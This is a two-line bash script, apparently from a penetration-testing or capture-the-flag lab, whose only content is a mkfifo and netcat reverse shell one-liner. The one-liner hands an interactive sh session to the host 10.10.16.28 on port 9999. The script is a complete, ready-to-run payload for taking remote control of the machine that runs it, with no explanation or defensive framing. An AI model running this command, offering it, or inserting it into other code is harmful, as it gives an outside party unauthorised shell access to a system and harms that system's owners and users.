#!/bin/bash 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.28 9999 >/tmp/f
